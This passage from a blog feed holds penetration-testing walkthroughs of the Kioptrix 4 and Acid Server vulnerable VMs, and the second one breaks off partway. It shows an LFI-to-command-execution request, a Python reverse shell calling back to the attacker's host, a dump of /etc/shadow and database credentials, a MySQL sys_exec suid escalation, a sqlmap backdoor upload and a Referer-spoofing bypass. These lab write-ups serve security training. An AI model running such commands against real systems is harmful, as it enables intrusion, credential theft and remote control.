</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id&lt;/a>&rdquo;
</span><span class='line'>myusername|s:32:&ldquo;uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>&rdquo;;mypassword|s:15:&ldquo;test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql&lt;/a>&rdquo;
</span><span class='line'>myusername|s:32:&ldquo;CREATE TABLE &lt;code>members&lt;/code> (
</span><span class='line'>&lt;code>id&lt;/code> int(4) NOT NULL auto_increment,
</span><span class='line'>&lt;code>username&lt;/code> varchar(65) NOT NULL default &lsquo;&rsquo;,
</span><span class='line'>&lt;code>password&lt;/code> varchar(65) NOT NULL default &lsquo;&rsquo;,
</span><span class='line'>PRIMARY KEY (&lt;code>id&lt;/code>)
</span><span class='line'>) TYPE=MyISAM AUTO_INCREMENT=2 ;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&ndash;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>&ndash; Dumping data for table &lt;code>members&lt;/code>&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>INSERT INTO &lt;code>members&lt;/code> VALUES (1, &lsquo;john&rsquo;, &lsquo;1234&rsquo;);
</span><span class='line'>&ldquo;;mypassword|s:15:"test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:/var/www/html# nc -l -p 1234
</span><span class='line'>/bin/sh: can&rsquo;t access tty; job control turned off
</span><span class='line'>$ id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+&lt;/a>&lsquo;import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.80.137\&rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&ldquo;/bin/sh\&rdquo;,\&ldquo;-i\&rdquo;]);&rsquo;"&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ cat checklogin.php
</span><span class='line'>&lt;?php
</span><span class='line'>ob_start();
</span><span class='line'>$host=&ldquo;localhost&rdquo;; // Host name
</span><span class='line'>$username=&ldquo;root&rdquo;; // Mysql username
</span><span class='line'>$password=&ldquo;&rdquo;; // Mysql password
</span><span class='line'>$db_name=&ldquo;members&rdquo;; // Database name
</span><span class='line'>$tbl_name=&ldquo;members&rdquo;; // Table name&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// Connect to server and select databse.
</span><span class='line'>mysql_connect(&ldquo;$host&rdquo;, &ldquo;$username&rdquo;, &ldquo;$password&rdquo;)or die(&ldquo;cannot connect&rdquo;);
</span><span class='line'>mysql_select_db(&ldquo;$db_name&rdquo;)or die(&ldquo;cannot select DB&rdquo;);&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// Define $myusername and $mypassword
</span><span class='line'>$myusername=$&lt;em>POST[&lsquo;myusername&rsquo;];
</span><span class='line'>$mypassword=$&lt;/em>POST[&lsquo;mypassword&rsquo;];&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// To protect MySQL injection (more detail about MySQL injection)
</span><span class='line'>$myusername = stripslashes($myusername);
</span><span class='line'>//$mypassword = stripslashes($mypassword);
</span><span class='line'>$myusername = mysql_real_escape_string($myusername);
</span><span class='line'>//$mypassword = mysql_real_escape_string($mypassword);&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>//$sql=&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;;
</span><span class='line'>$result=mysql_query(&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;);
</span><span class='line'>//$result=mysql_query($sql);&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// Mysql_num_row is counting table row
</span><span class='line'>$count=mysql_num_rows($result);
</span><span class='line'>// If result matched $myusername and $mypassword, table row must be 1 row&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>if($count!=0){
</span><span class='line'>// Register $myusername, $mypassword and redirect to file &ldquo;login_success.php&rdquo;
</span><span class='line'>    session_register(&ldquo;myusername&rdquo;);
</span><span class='line'>    session_register(&ldquo;mypassword&rdquo;);
</span><span class='line'>    header(&ldquo;location:login_success.php?username=$myusername&rdquo;);
</span><span class='line'>}
</span><span class='line'>else {
</span><span class='line'>echo &ldquo;Wrong Username or Password&rdquo;;
</span><span class='line'>print(&lsquo;&lt;form method="link" action="index.php">&lt;input type=submit value="Try Again">&lt;/form>&rsquo;);
</span><span class='line'>}&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>ob_end_flush();
</span><span class='line'>?></span></code></pre></td></tr></table></div></figure></p>

<p>Because the mysql instance is running as root user, we have a full access to
the database. We dump it and use the credentials for ssh login, for example
with the user <code>john</code>. The <code>lshell</code> is executed, but noticing his <code>.lhistory</code> file,
bash could be directly executed too. Finally, we set the suid privileges for
<code>dash</code> using mysql and obtain the root privileges:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo &ldquo;select * from members&rdquo; | mysql -u root members
</span><span class='line'>id  username    password
</span><span class='line'>1   john    MyNameIsJohn
</span><span class='line'>2   robert  ADGAdsafdfwt4gadfga==&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ cat /home/john/.lhistory
</span><span class='line'>?
</span><span class='line'>help
</span><span class='line'>echo os.system(&lsquo;/bin/bash&rsquo;)
</span><span class='line'>exit
</span><span class='line'>su
</span><span class='line'>sudo
</span><span class='line'>?
</span><span class='line'>scp
</span><span class='line'>touch hello
</span><span class='line'>help
</span><span class='line'>ls /root
</span><span class='line'>exit
</span><span class='line'>echo os.system(&lsquo;/bin/bash&rsquo;)
</span><span class='line'>exit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# ssh -l john 192.168.80.154
</span><span class='line'>&lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#111;&#x68;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#56;&#48;&#x2e;&#49;&#x35;&#x34;">&#x6a;&#x6f;&#104;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#56;&#48;&#x2e;&#x31;&#53;&#52;&lt;/a>&rsquo;s password:
</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
</span><span class='line'>== Welcome LigGoat Employee ==
</span><span class='line'>LigGoat Shell is in place so you  don&rsquo;t screw up
</span><span class='line'>Type &lsquo;?&rsquo; or &lsquo;help&rsquo; to get the list of allowed commands
</span><span class='line'>john:~$ echo os.system(&lsquo;/bin/bash&rsquo;)
</span><span class='line'>john@Kioptrix4:~$ id
</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>john:~$ mysql -u root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mysql> select sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;);
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;) |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| NULL                                 |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>1 row in set (0.01 sec)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mysql>
</span><span class='line'>[1]+  Stopped                 mysql -u root
</span><span class='line'>john@Kioptrix4:~$ cat /tmp/a
</span><span class='line'>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
</span><span class='line'>daemon:&lt;em>:15374:0:99999:7:::
</span><span class='line'>bin:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>sys:&lt;em>:15374:0:99999:7:::
</span><span class='line'>sync:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>games:&lt;em>:15374:0:99999:7:::
</span><span class='line'>man:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>lp:&lt;em>:15374:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:15374:0:99999:7:::">news:*:15374:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:15374:0:99999:7:::
</span><span class='line'>proxy:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>www-data:&lt;em>:15374:0:99999:7:::
</span><span class='line'>backup:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>list:&lt;em>:15374:0:99999:7:::
</span><span class='line'>irc:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>gnats:&lt;em>:15374:0:99999:7:::
</span><span class='line'>nobody:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>libuuid:!:15374:0:99999:7:::
</span><span class='line'>dhcp:&lt;em>:15374:0:99999:7:::
</span><span class='line'>syslog:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>klog:&lt;em>:15374:0:99999:7:::
</span><span class='line'>mysql:!:15374:0:99999:7:::
</span><span class='line'>sshd:&lt;/em>:15374:0:99999:7:::
</span><span class='line'>loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
</span><span class='line'>john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
</span><span class='line'>robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
</span><span class='line'>john@Kioptrix4:/etc/samba$&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mysql> select sys_exec(&lsquo;chmod +s /bin/dash&rsquo;);
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| sys_exec(&lsquo;chmod +s /bin/dash&rsquo;) |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| NULL                           |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>1 row in set (0.01 sec)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>john@Kioptrix4:~$ /bin/dash&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat congrats.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Congratulations!
</span><span class='line'>You&rsquo;ve got root.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>There is more then one way to get root on this system. Try and find them.
</span><span class='line'>I&rsquo;ve only tested two (2) methods, but it doesn&rsquo;t mean there aren&rsquo;t more.
</span><span class='line'>As always there&rsquo;s an easy way, and a not so easy way to pop this box.
</span><span class='line'>Look for other methods to get root privileges other than running an exploit.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>It took a while to make this. For one it&rsquo;s not as easy as it may look, and
</span><span class='line'>also work and family life are my priorities. Hobbies are low on my list.
</span><span class='line'>Really hope you enjoyed this one.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>If you haven&rsquo;t already, check out the other VMs available on:
</span><span class='line'>www.kioptrix.com&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Thanks for playing,
</span><span class='line'>loneferret</span></code></pre></td></tr></table></div></figure></p>

<p>Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &lt;a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php&lt;/a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;id&rsquo; &ndash;batch | grep uid
</span><span class='line'>command standard output:    &lsquo;uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# sqlmap -u &lt;a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php&lt;/a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;cat /root/congrats.txt&rsquo; &ndash;batch
</span><span class='line'>&hellip;
</span><span class='line'>[00:13:06] [INFO] the backdoor has been successfully uploaded on &lsquo;/var/www/&rsquo; - &lt;a href="http://192.168.80.154:80/tmpbborl.php">http://192.168.80.154:80/tmpbborl.php&lt;/a>
</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] Y&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>command standard output:&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>Congratulations!
</span><span class='line'>You&rsquo;ve got root.
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Acid Server: 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/08/17/acid-server-1/"/>
    <updated>2015-08-17T21:00:53+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/08/17/acid-server-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server: 1</a></p>

<p>We received the IP address 192.168.80.158 for the vulnerable image. Nmap output for TCP scan:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sT -p- 192.168.80.158 -sV&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-29 13:45 CEST
</span><span class='line'>Nmap scan report for 192.168.80.158
</span><span class='line'>Host is up (0.00045s latency).
</span><span class='line'>Not shown: 65534 closed ports
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>We found the web server. There was a hex value as the last line of the index page:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &lt;a href="http://192.168.80.158:33447/">http://192.168.80.158:33447/&lt;/a>
</span><span class='line'>[ .. snip ..]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;!--0x643239334c6d70775a773d3d-->
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Converting in python:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# python&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>s = &lsquo;643239334c6d70775a773d3d&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>s.decode(&lsquo;hex&rsquo;)
</span><span class='line'>&lsquo;d293LmpwZw==&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>import base64&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>base64.b64decode(s.decode(&lsquo;hex&rsquo;))
</span><span class='line'>&lsquo;wow.jpg&rsquo;</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>

<p>We downloaded the <a href="http://192.168.80.158:33447/images/wow.jpg">picture</a> and found another hex string:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# strings wow.jpg&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# python&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>import re
</span><span class='line'>s = &lsquo;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>re.sub(&lsquo;:&rsquo;, &lsquo;&rsquo;, s).decode(&lsquo;hex&rsquo;)
</span><span class='line'>&lsquo;7aee0f6d588ed9905ee37f16a7c610d4&rsquo;</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>

<p>Googling this MD5 hash, we found out that it represents the value <code>63425</code>:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# echo -n 63425 | md5sum
</span><span class='line'>7aee0f6d588ed9905ee37f16a7c610d4  -</span></code></pre></td></tr></table></div></figure></p>

<p>After a few minutes of waiting, the UDP scan finished, but we found only NTP server listening:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.158 -sU
</span><span class='line'>&hellip;
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>123/udp open  ntp</span></code></pre></td></tr></table></div></figure></p>

<p>Reading the page title (or dirb tool) reveals an interesting URL: <a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl -s &lt;a href="http://192.168.80.158:33447/Challenge/index.php">http://192.168.80.158:33447/Challenge/index.php&lt;/a> | head -1
</span><span class='line'>&lt;!DOCTYPE gkg.qvpn html>
</span><span class='line'>&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>codecs.encode(&lsquo;gkg.qvpn&rsquo;, &lsquo;rot13&rsquo;)
</span><span class='line'>&lsquo;txt.dica&rsquo;&lt;/p>&lt;/blockquote>&lt;/blockquote>&lt;/blockquote>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# curl -s &lt;a href="http://192.168.80.158:33447/Challenge/acid.txt">http://192.168.80.158:33447/Challenge/acid.txt&lt;/a>
</span><span class='line'>/protected_page.php</span></code></pre></td></tr></table></div></figure></p>

<p>We had no further access for <code>/protected_page.php</code>, but the first idea that we had was a referrer check. After verifying by spoofing this value:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>GET /Challenge/protected_page.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.158:33447
</span><span class='line'>Referer: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://192.168.80.158:33447/Challenge/includes/process_login.php&quot;</span><span class="nt">&gt;</span>http://192.168.80.158:33447/Challenge/includes/process_login.php<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Cookie: sec_session_id=a2gico0b4hgkd0e2av9k3qh8m0
</span><span class='line'>Connection: keep-alive<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>..<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;</span>!DOCTYPE html&gt;
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'>    <span class="nt">&lt;head&gt;</span>
</span><span class='line'>        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;styles/main.css&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;title&gt;</span>Secure Login: Protected Page<span class="nt">&lt;/title&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/head&gt;</span>
</span><span class='line'>    <span class="nt">&lt;body&gt;</span>
</span><span class='line'>         <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;wrapper&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;container&quot;</span><span class="nt">&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;pre&gt;&lt;code&gt;</span>                                            <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>h1<span class="ni">&amp;gt;</span>Congrats..! You have bypassed User Panel Successfully.<span class="ni">&amp;lt;</span>/h1<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>
